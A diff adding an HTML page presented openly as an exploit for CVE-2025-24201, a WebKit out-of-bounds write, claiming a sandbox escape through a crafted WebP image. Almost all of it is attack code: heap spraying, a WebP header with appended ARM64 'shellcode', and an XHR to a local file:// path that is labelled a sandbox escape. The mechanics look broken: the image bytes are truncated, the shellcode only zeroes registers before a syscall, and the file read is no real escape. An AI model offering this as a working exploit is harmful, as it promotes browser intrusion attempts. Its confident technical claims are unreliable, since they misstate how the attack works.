@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebKit Glass Cage Exploit</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <script>
+        // CVE-2025-24201: WebKit out-of-bounds write exploit
+        
+        function prepareHeap() {
+            var objects = [];
+            
+            for (var i = 0; i < 1000; i++) {
+                var obj = new ArrayBuffer(0x1000);
+                var view = new Uint32Array(obj);
+                
+                for (var j = 0; j < view.length; j++) {
+                    view[j] = 0x41414141 + i;
+                }
+                
+                objects.push(obj);
+            }
+            
+            return objects;
+        }
+        
+        function triggerVulnerability() {
+            var webpData = createMaliciousWebP();
+            
+            var img = new Image();
+            img.onload = function() {
+                console.log("[+] Image loaded, vulnerability triggered");
+                executeSandboxEscape();
+            };
+            
+            img.onerror = function() {
+                console.log("[!] Exploit may have failed");
+            };
+            
+            img.src = "data:image/webp;base64," + btoa(webpData);
+        }
+        
+        function createMaliciousWebP() {
+            var webp = new Uint8Array([
+                0x52, 0x49, 0x46, 0x46,  // "RIFF"
+                0x00, 0x00, 0x10, 0x00,  // File size
+                0x57, 0x45, 0x42, 0x50,  // "WEBP"
+                0x56, 0x50, 0x38, 0x4C,  // "VP8L"
+                0x00, 0x00, 0x08, 0x00,  // Chunk size
+                0x2F, 0x00, 0x00, 0x00,  // Image width/height
+                0x10, 0x00, 0x00, 0x00,  // Transform and color cache bits
+            ]);
+            
+            var payload = createExploitPayload();
+            var combined = new Uint8Array(webp.length + payload.length);
+            combined.set(webp);
+            combined.set(payload, webp.length);
+            
+            return Array.from(combined).map(x => String.fromCharCode(x)).join('');
+        }
+        
+        function createExploitPayload() {
+            return new Uint8Array([
+                0x00, 0x00, 0x80, 0xd2,  // mov x0, #0
+                0x01, 0x00, 0x80, 0xd2,  // mov x1, #0
+                0x02, 0x00, 0x80, 0xd2,  // mov x2, #0
+                0x10, 0x00, 0x80, 0xd2,  // mov x16, #0 (syscall)
+                0x01, 0x00, 0x00, 0xd4,  // svc #0
+            ]);
+        }
+        
+        function executeSandboxEscape() {
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'file:///var/mobile/Library/Preferences/', true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 200) {
+                            console.log("[+] Sandbox escape successful!");
+                        }
+                    }
+                };
+                xhr.send();
+                
+            } catch (e) {
+                console.log("[!] Sandbox escape failed: " + e.message);
+            }
+        }
+        
+        window.onload = function() {
+            console.log("[+] WebKit Glass Cage Exploit Loading...");
+            console.log("[+] Target: CVE-2025-24201 - WebKit Sandbox Escape");
+            
+            var objects = prepareHeap();
+            console.log("[+] Heap prepared with " + objects.length + " objects");
+            
+            setTimeout(triggerVulnerability, 1000);
+        };
+    </script>
+    
+    <div style="font-family: monospace; padding: 20px;">
+        <h1>WebKit Glass Cage Exploit</h1>
+        <p><strong>CVE-2025-24201</strong> - WebKit Out-of-bounds Write</p>
+        <p>Target Component: WebKit Image Processing</p>
+        <p>Attack Vector: Malicious WebP Image</p>
+        <p>Objective: Sandbox Escape</p>
+        
+        <div id="status">
+            <p>Exploit Status: <span id="exploit-status">Initializing...</span></p>
+        </div>
+        
+        <div style="margin-top: 20px; font-size: 12px; color: #666;">
+            <p><em>This exploit demonstrates CVE-2025-24201 for educational purposes.</em></p>
+            <p><em>Unauthorized use is prohibited and illegal.</em></p>
+        </div>
+    </div>
+</body>
+</html>
